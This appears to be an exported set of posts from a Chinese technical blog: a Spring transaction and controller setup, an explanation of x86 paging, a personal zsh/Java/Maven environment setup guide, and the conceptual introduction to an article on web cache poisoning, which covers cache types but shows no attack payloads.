<h2 id="9-事务管理"><a href="#9-事务管理" class="headerlink" title="9. 事务管理"></a>9. 事务管理</h2><p>ApplicationContext.xml添加声明式事务管理</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置Spring框架声明式事务管理--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置事务管理器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;transactionManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置事务通知--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">transaction-manager</span>=<span class="string">&quot;transactionManager&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;find*&quot;</span> <span class="attr">read-only</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">isolation</span>=<span class="string">&quot;DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--配置AOP增强--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;txAdvice&quot;</span> <span class="attr">pointcut</span>=<span class="string">&quot;execution(* com.shadowflow.service.impl.*ServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.jsp添加一个表单</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">    &lt;a href=<span class="string">&quot;account/findAll&quot;</span>&gt;测试查询&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h3&gt;测试包&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">&quot;account/save&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">        姓名：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> /&gt;&lt;br/&gt;</span><br><span class="line">        金额：&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;money&quot;</span> /&gt;&lt;br/&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;保存&quot;</span>/&gt;&lt;br/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>AccountController.java添加保存的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/save&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(Account account, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    accountService.saveAccount(account);</span><br><span class="line">    response.sendRedirect(request.getContextPath()+<span class="string">&quot;/account/findAll&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="../images/pics/java/30.jpg"> </p>
<p><img src="../images/pics/java/31.jpg"> </p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>Java框架</tag>
      </tags>
  </entry>
  <entry>
    <title>x86段页式内存管理和页表映射机制</title>
    <url>/x86%E6%AE%B5%E9%A1%B5%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%92%8C%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>无论是内核空间还是用户空间，他们里面的地址都是虚拟地址。实际CPU在执行的时候会把虚拟地址转换为物理地址。</p>
<span id="more"></span>



<h2 id="1-X86内存结构"><a href="#1-X86内存结构" class="headerlink" title="1. X86内存结构"></a>1. X86内存结构</h2><ul>
<li>X86内存地址原理图</li>
</ul>
<p><img src="../images/pics/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%BA%95%E5%B1%82/20.jpg"></p>
<p>最上面是一个逻辑地址，中间是一个线性地址，最右边是一个物理地址。对于x86架构来说，它是一个段页式的内存管理机制。代码里面访问的地址都是逻辑地址，CPU在拿到逻辑地址后，会把它转化为线性地址，线性地址再通过页表映射的机制转换为真正的物理地址。<strong>从逻辑地址到线性地址叫做段页式转换，从线性地址到物理地址这个过程叫做页表映射。</strong>页表映射分为当级页表映射、二级页表映射、三级页表映射、四级页表映射。在X86的Linux内核里面，把段基址设成了0，逻辑地址和线性地址是一样的。</p>
<h2 id="2-页表映射"><a href="#2-页表映射" class="headerlink" title="2. 页表映射"></a>2. 页表映射</h2><p><img src="../images/pics/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%BA%95%E5%B1%82/21.jpg"></p>
<p>在32位系统里面，线性地址是32个地址位，刚好是4G空间， 这个线性空间其实就是32个比特位。CPU在做页表映射的时候做个区分，最底下的12个比特是Offset，中间的10个比特是页表的便宜（索引），最高的10个是页目录的索引。</p>
<p><strong>页目录表</strong></p>
<p>页目录表存的一个一个页表的地址，一个页目录表会保存1024条数据，每条数据刚好是4个字节，所以一个页表刚好是4K，刚好占据一个物理块。</p>
<p>页目录表存储在CR3寄存器中，Linux有很多页目录表，内核共用同一个页目录表，不同的进程有自己的页目录表，所以用户空间的进程进行了隔离。</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>一些环境配置问题</title>
    <url>/%E4%B8%80%E4%BA%9B%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>一些个人的配置和环境问题</p>
<span id="more"></span>

<h2 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h2><h3 id="item2"><a href="#item2" class="headerlink" title="item2"></a>item2</h3><p>背景和提示颜色</p>
<p>这里字体颜色就是旁边的Green</p>
<p><img src="../images/pic/zhongduan.jpg"></p>
<p>背景色如下</p>
<img src="../images/pic/zhongduan3.jpg" style="zoom: 50%;" /> 

<p>可以设置透明度和毛玻璃效果，但是我<u>感觉不好看没有使用</u></p>
<p><img src="../images/pic/zhongduan2.jpg"></p>
<p>除此之外，修改windows的新终端的窗口大小，我设置的Columns: 105，Rows:28</p>
<p>Text中字体大小：15</p>
<p>关闭声音：Preferences -&gt; Profiles -&gt; Terminal -&gt; silence bell</p>
<h3 id="终端显示"><a href="#终端显示" class="headerlink" title="终端显示"></a>终端显示</h3><p><strong>安装zsh</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">brew install zsh</span><br><span class="line">chsh -s <span class="regexp">/bin/</span>zsh</span><br></pre></td></tr></table></figure>

<p><strong>安装oh-my-zsh</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/robbyrussell/</span>oh-my-zsh.git ~/.oh-my-zsh</span><br></pre></td></tr></table></figure>

<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">cp ~<span class="regexp">/.zshrc ~/</span>.zshrc.bak</span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cp ~<span class="regexp">/.oh-my-zsh/</span>templates<span class="regexp">/zshrc.zsh-template ~/</span>.zshrc</span><br></pre></td></tr></table></figure>

<p><font color="red">推出bash,重新进入zsh</font></p>
<p><strong>zsh配置上方显示主机名</strong></p>
<p>vim ~/.zshrc</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Uncomment the following line to <span class="built_in">disable</span> auto-setting terminal title.</span></span><br><span class="line">DISABLE_AUTO_TITLE=&quot;true&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> title</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> uncomment DISABLE_AUTO_TITLE=<span class="string">&quot;true&quot;</span></span></span><br><span class="line">TERM_TITLE=&quot;\e]0;%n@%m\a&quot;</span><br><span class="line">precmd() &#123;</span><br><span class="line">    print -Pn &quot;$TERM_TITLE&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">set</span> title to running process</span></span><br><span class="line">preexec () &#123;</span><br><span class="line">    print -Pn &quot;\e]0;%n@%m [$3]\a&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><strong>设置Promt</strong></p>
<p>在.zshrc里配置，这种显示好处就是截图或者复制终端的结果比较容易看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PROMPT=&#x27;%&#123;$fg_bold[red]%&#125;[%n@%m %&#123;$fg[red]%&#125;%c]%(!.#.$)%&#123;$reset_color%&#125; &#x27;</span><br></pre></td></tr></table></figure>

<p>最终效果</p>
<p><img src="../images/pic/zhongduan5.jpg"></p>
<h3 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h3><p>.zshrc设置代理快捷命令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#终端设置代理</span></span><br><span class="line"><span class="comment">#polipo proxy on/off</span></span><br><span class="line"></span><br><span class="line">function proxysockes_on()&#123;</span><br><span class="line">	#配置http访问</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">http_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">https_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=socks5://172.16.42.1:1086</span><br><span class="line">	echo <span class="string">&#x27;**************开启当前终端socks5代理**************&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function proxyhttp_on()&#123;</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">http_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">https_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	<span class="builtin-name">export</span> <span class="attribute">all_proxy</span>=http://172.16.42.1:1087</span><br><span class="line">	echo <span class="string">&#x27;*************开启当前终端http代理**************&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function proxy_off()&#123;</span><br><span class="line">	#移除代理</span><br><span class="line">	unset http_proxy</span><br><span class="line">	unset https_proxy</span><br><span class="line">	unset all_proxy</span><br><span class="line">	echo <span class="string">&#x27;************关闭当前终端代理***********&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>proxysockes_on命令开始socks5代理</p>
<p>proxyhttp_on命令开启http代理</p>
<p>proxy_off关闭代理</p>
<h3 id="zsh插件"><a href="#zsh插件" class="headerlink" title="zsh插件"></a>zsh插件</h3><p>自动补全插件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/zsh-users/</span>zsh-autosuggestions <span class="variable">$ZSH_CUSTOM</span><span class="regexp">/plugins/</span>zsh-autosuggestions</span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="comment"># 加入插件列表</span></span><br><span class="line">plugins=(git zsh-autosuggestions)</span><br><span class="line">source ~/.zshrc</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><h3 id="最近项目文件"><a href="#最近项目文件" class="headerlink" title="最近项目文件"></a>最近项目文件</h3><p>最近碰到一个问题，idea的项目是在外接硬盘中，现在没有插硬盘，打开idea的时候找不到最近项目以至于卡死。</p>
<p>mac下解决方法如下：</p>
<p>JetBrains根目录：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Users/</span>shadowflow<span class="regexp">/Library/</span>Application Support/JetBrains</span><br></pre></td></tr></table></figure>

<p>我使用的是IntelliJIdea2021.2，进入该目录</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Users/</span>shadowflow<span class="regexp">/Library/</span>Application Support<span class="regexp">/JetBrains/</span>IntelliJIdea2021.<span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>再进入options目录，打开<code>recentProjects.xml</code></p>
<p>删除掉map标签中的entry标签</p>
<p>删除之后就留了一个项目，如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">component</span> <span class="attr">name</span>=<span class="string">&quot;RecentProjectsManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;additionalInfo&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">&quot;$USER_HOME$/IntelliJIDEAProjects/HelleWorld&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">RecentProjectMetaInfo</span> <span class="attr">frameTitle</span>=<span class="string">&quot;HelleWorld – MainActivity.kt&quot;</span> <span class="attr">projectWorkspaceId</span>=<span class="string">&quot;1xZ3x6KCEsIcFlenjelbyS8p9Nf&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;binFolder&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$APPLICATION_HOME_DIR$/bin&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;build&quot;</span> <span class="attr">value</span>=<span class="string">&quot;IU-212.4746.92&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;buildTimestamp&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1627369780208&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">frame</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;23&quot;</span> <span class="attr">width</span>=<span class="string">&quot;1440&quot;</span> <span class="attr">height</span>=<span class="string">&quot;877&quot;</span> <span class="attr">extendedState</span>=<span class="string">&quot;6&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;productionCode&quot;</span> <span class="attr">value</span>=<span class="string">&quot;IU&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;projectOpenTimestamp&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1630551739420&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">RecentProjectMetaInfo</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">name</span>=<span class="string">&quot;lastProjectLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$USER_HOME$/code/java/study&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">component</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="java"><a href="#java" class="headerlink" title="java"></a>java</h2><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>下载</p>
<p><a href="https://www.oracle.com/java/technologies/downloads/#java8">https://www.oracle.com/java/technologies/downloads/#java8</a></p>
<p>mac下java路径</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/Library/</span>Java/JavaVirtualMachines</span><br></pre></td></tr></table></figure>

<p>环境变量</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#java</span></span><br><span class="line">export JAVA_HOME=<span class="regexp">/Library/</span>Java<span class="regexp">/JavaVirtualMachines/</span>jdk1.<span class="number">8.0</span>_301.jdk<span class="regexp">/Contents/</span>Home</span><br><span class="line">export CLASSPATH=<span class="variable">$JAVA_HOME</span><span class="regexp">/lib/</span>tools.jar:<span class="variable">$JAVA_HOME</span><span class="regexp">/lib/</span>dt.jar:<span class="variable">$JAVA_HOME</span>/lib</span><br><span class="line">export PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p><strong>找不到com.sun tools.jar 和jconsole.jar</strong></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="params">&lt;dependency&gt;</span></span><br><span class="line">    <span class="params">&lt;groupId&gt;</span>com.sun<span class="params">&lt;/groupId&gt;</span></span><br><span class="line">    <span class="params">&lt;artifactId&gt;</span>tools<span class="params">&lt;/artifactId&gt;</span></span><br><span class="line">    <span class="params">&lt;version&gt;</span><span class="number">1.8</span><span class="params">&lt;/version&gt;</span></span><br><span class="line">    <span class="params">&lt;scope&gt;</span>system<span class="params">&lt;/scope&gt;</span></span><br><span class="line">    <span class="params">&lt;systemPath&gt;</span>$&#123;JAVA_HOME&#125;<span class="meta-keyword">/lib/</span>tools.jar<span class="params">&lt;/systemPath&gt;</span></span><br><span class="line"><span class="params">&lt;/dependency&gt;</span></span><br><span class="line"><span class="params">&lt;dependency&gt;</span></span><br><span class="line">    <span class="params">&lt;groupId&gt;</span>com.sun<span class="params">&lt;/groupId&gt;</span></span><br><span class="line">    <span class="params">&lt;artifactId&gt;</span>jconsole<span class="params">&lt;/artifactId&gt;</span></span><br><span class="line">    <span class="params">&lt;version&gt;</span><span class="number">1.8</span><span class="params">&lt;/version&gt;</span></span><br><span class="line">    <span class="params">&lt;scope&gt;</span>system<span class="params">&lt;/scope&gt;</span></span><br><span class="line">    <span class="params">&lt;systemPath&gt;</span>$&#123;JAVA_HOME&#125;<span class="meta-keyword">/lib/</span>jconsole.jar<span class="params">&lt;/systemPath&gt;</span></span><br><span class="line"><span class="params">&lt;/dependency&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h3><p>.zshrc</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#maven</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">MAVEN_HOME</span>=/Library/Java/JavaVirtualMachines/apache-maven-3.8.2</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$MAVEN_HOME</span>/bin:$PATH</span><br></pre></td></tr></table></figure>

<p>修改源/Library/Java/JavaVirtualMachines/apache-maven-3.8.2/conf/settings.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span>        </span><br><span class="line">  <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h2><p>环境变量</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Golang</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">GOROOT</span>=/usr/local/go</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">GOPATH</span>=<span class="variable">$HOME</span>/go</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$PATH</span>:$GOROOT/bin:$GOPATH/bin</span><br></pre></td></tr></table></figure>





<h2 id="软件问题"><a href="#软件问题" class="headerlink" title="软件问题"></a>软件问题</h2><h3 id="parallels-desktop"><a href="#parallels-desktop" class="headerlink" title="parallels desktop"></a>parallels desktop</h3><p>卸载parallels desktop后，如何清除多余的“打开方式”项？</p>
<p>执行如下命令</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/System/</span>Library<span class="regexp">/Frameworks/</span>CoreServices.framework<span class="regexp">/Frameworks/</span>LaunchServices.framework<span class="regexp">/Support/</span>lsregister -kill -r -domain local-domain system -domain user</span><br></pre></td></tr></table></figure>



<h3 id="Mos"><a href="#Mos" class="headerlink" title="Mos"></a>Mos</h3><p><a href="https://github.com/Caldis/Mos">https://github.com/Caldis/Mos</a></p>
<p>mac上的鼠标滚轮方向调整工具</p>
<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><h3 id="debian-10"><a href="#debian-10" class="headerlink" title="debian:10"></a>debian:10</h3><h4 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载jdk-8u251-linux-x64.tar.gz, 搜索jdk install</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line">sudo tar -C /usr/local -xzf jdk-8u251-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># vim /.zshrc</span></span><br><span class="line"><span class="comment">#java</span></span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">JAVA_HOME</span>=/usr/local/jdk1.8.0_251</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">CLASSPATH</span>=<span class="variable">$JAVA_HOME</span>/lib/tools.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib</span><br><span class="line"><span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$JAVA_HOME</span>/bin:$PATH</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#下载，访问https://maven.apache.org/download.cgi</span></span><br><span class="line">wget https:<span class="regexp">//</span>dlcdn.apache.org<span class="regexp">/maven/m</span>aven-<span class="number">3</span><span class="regexp">/3.8.5/</span>binaries/apache-maven-<span class="number">3.8</span>.<span class="number">5</span>-bin.tar.gz</span><br><span class="line"></span><br><span class="line">sudo tar -C <span class="regexp">/usr/</span>local -xzf apache-maven-<span class="number">3.8</span>.<span class="number">5</span>-bin.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># vim /.zshrc</span></span><br><span class="line"><span class="comment">#maven</span></span><br><span class="line">export MAVEN_HOME=<span class="regexp">/usr/</span>local/apache-maven-<span class="number">3.8</span>.<span class="number">5</span></span><br><span class="line">export PATH=<span class="variable">$MAVEN_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line">修改源<span class="regexp">/user/</span>local<span class="regexp">/apache-maven-3.8.5/</span>conf/settings.xml</span><br><span class="line">  &lt;mirrors&gt; </span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">      &lt;id&gt;alimaven&lt;/id&gt;</span><br><span class="line">      &lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class="line">      &lt;url&gt;http:<span class="regexp">//m</span>aven.aliyun.com<span class="regexp">/nexus/</span>content<span class="regexp">/groups/</span>public<span class="regexp">/&lt;/u</span>rl&gt;</span><br><span class="line">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;        </span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">  &lt;/mirrors&gt;</span><br></pre></td></tr></table></figure>

<p>vim</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">set</span> <span class="attribute">background</span>=dark</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>环境</tag>
        <tag>配置</tag>
      </tags>
  </entry>
  <entry>
    <title>web缓存投毒攻击全解</title>
    <url>/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB%E5%85%A8%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p>上善若水。水善利万物而不争，处众人之所恶，故几于道。</p>
</blockquote>
<p>web cache poisoning(web缓存投毒攻击) 一直是一种理论上的漏洞，James Kettle的研究将理论带入到实践。web缓存投毒攻击因James Kettle在black hat 2018 和black hat 2020关于缓存投毒的演讲而知名</p>
<p>本篇文章结合了James Kettle及其他人员关于 web cache poisoning 的研究成果，并结合案例及靶机进行讲解。</p>
<span id="more"></span>

<h2 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1. 基础概念"></a>1. 基础概念</h2><h3 id="1-1-web-缓存"><a href="#1-1-web-缓存" class="headerlink" title="1.1 web 缓存"></a>1.1 web 缓存</h3><p>web缓存在网络世界中无处不在，处于client 和 server之间，保存着某些响应的副本，当下次请求同一个资源的时候，缓存会将响应直接返回给client，而不用再去请求server。</p>
<p><img src="../images/pics/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%E6%94%BB%E5%87%BB/image-20210109150534753.png" alt="image-20210109150534753"></p>
<p>缓存存在的目的就是提升网页加载速度、减少server的负载。有些公司可能会使用类似Varnish的软件来建自己的缓存，但更多的会选择使用其他厂商的CDN服务，比如Cloudflare。随着CDN的流行，许多web应用程序或框架已经内部集成了缓存的功能，比如Drupal。除了web缓存外，还有其他类型的缓存，比如浏览器缓存、DNS缓存等，但这些不在本次讨论的范围中。</p>
<h3 id="1-2-不同种类的缓存"><a href="#1-2-不同种类的缓存" class="headerlink" title="1.2 不同种类的缓存"></a>1.2 不同种类的缓存</h3><p><strong>1. 数据库缓存</strong></p>
<p>有的web应用，数据表繁多，如果频繁进行数据库查询，很容易导致数据库不堪重负。为了提高查询的性能，会将查询后的数据放到内存中进行缓存，下次查询时，直接从内存缓存返回，提高响应效率，常用的缓存方案有memcached、redis等。</p>
<p><strong>2. 服务端缓存（本文的攻击目标就是服务端缓存）</strong></p>
<p>服务端缓存包含代理服务器缓存和CDN缓存，也就是我们的攻击目标，如果是浏览器缓存攻击不在本文讨论范围之内</p>
<p>1）代理服务器缓存</p>
<p>代理服务器是浏览器和源服务器的中间服务器，浏览器先向这个中间服务器发起Web请求，经过处理后（比如权限验证，缓存匹配等），再将请求转发到源服务器。</p>
<p>2）CDN缓存</p>
<p>CDN(Content delivery networks)缓存，也叫网关缓存、反向代理缓存。浏览器先向CDN网关发起Web请求，网关服务器后面对应着一台或多台负载均衡服务器，会根据它们的负载请求，动态将请求转发到合适的服务器上。</p>
<p><strong>3. 浏览器端缓存</strong></p>
<p>浏览器缓存(Browser Caching) 是浏览器端保存数据用于快速读取或避免重复资源请求的优化机制，有效的缓存使用可以避免重复的网络请求和浏览器快速地读取本地数据，整体上加速网页展示给用户。</p>
<p><strong>4. Web应用层缓存</strong></p>
<p>应用层缓存指的是从代码层面上，通过代码逻辑和缓存策略，实现对数据，页面，图片等资源的缓存，可以根据实际情况选择将数据存在文件系统或者内存中，减少数据库查询或者读写瓶颈，提高响应效率。</p>
<p>web应用缓存。</p>
